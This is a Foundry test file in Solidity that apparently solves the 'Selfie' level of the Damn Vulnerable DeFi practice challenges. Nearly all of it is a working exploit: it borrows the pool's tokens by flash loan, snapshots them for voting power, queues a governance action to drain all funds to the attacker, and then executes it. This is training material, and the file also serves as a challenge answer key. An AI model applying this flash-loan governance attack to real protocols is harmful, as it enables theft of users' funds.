// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableTokenSnapshot} from "../../../src/Contracts/DamnValuableTokenSnapshot.sol";
import {SimpleGovernance} from "../../../src/Contracts/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../../src/Contracts/selfie/SelfiePool.sol";

contract SelfieExploit {
    SelfiePool pool;
    DamnValuableTokenSnapshot dvt;
    SimpleGovernance governance;
    address payable attacker;

    constructor(address _pool, address _dvt, address _governance, address payable _attacker) {
        pool = SelfiePool(_pool);
        dvt = DamnValuableTokenSnapshot(_dvt);
        governance = SimpleGovernance(_governance);
        attacker = _attacker;
    }

    function receiveTokens(address _from, uint256 _amount) external {
        bytes memory data = abi.encodeWithSignature("drainAllFunds(address)", attacker);
        dvt.snapshot();
        governance.queueAction(address(pool), data, 0);
        dvt.transfer(address(pool), _amount);
    }

    function execute() external {
        uint256 poolBalance = dvt.balanceOf(address(pool));
        pool.flashLoan(poolBalance);
    }
}

contract Selfie is Test {
    uint256 internal constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 internal constant TOKENS_IN_POOL = 1_500_000e18;

    Utilities internal utils;
    SimpleGovernance internal simpleGovernance;
    SelfiePool internal selfiePool;
    DamnValuableTokenSnapshot internal dvtSnapshot;
    address payable internal attacker;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];

        vm.label(attacker, "Attacker");

        dvtSnapshot = new DamnValuableTokenSnapshot(TOKEN_INITIAL_SUPPLY);
        vm.label(address(dvtSnapshot), "DVT");

        simpleGovernance = new SimpleGovernance(address(dvtSnapshot));
        vm.label(address(simpleGovernance), "Simple Governance");

        selfiePool = new SelfiePool(
            address(dvtSnapshot),
            address(simpleGovernance)
        );

        dvtSnapshot.transfer(address(selfiePool), TOKENS_IN_POOL);

        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), TOKENS_IN_POOL);

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */

        SelfieExploit exploit = new SelfieExploit(
            address(selfiePool),
            address(dvtSnapshot),
            address(simpleGovernance),
            attacker);

        exploit.execute();

        vm.warp(block.timestamp + 3 days);

        simpleGovernance.executeAction(1);

        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        // Attacker has taken all tokens from the pool
        assertEq(dvtSnapshot.balanceOf(attacker), TOKENS_IN_POOL);
        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), 0);
    }
}
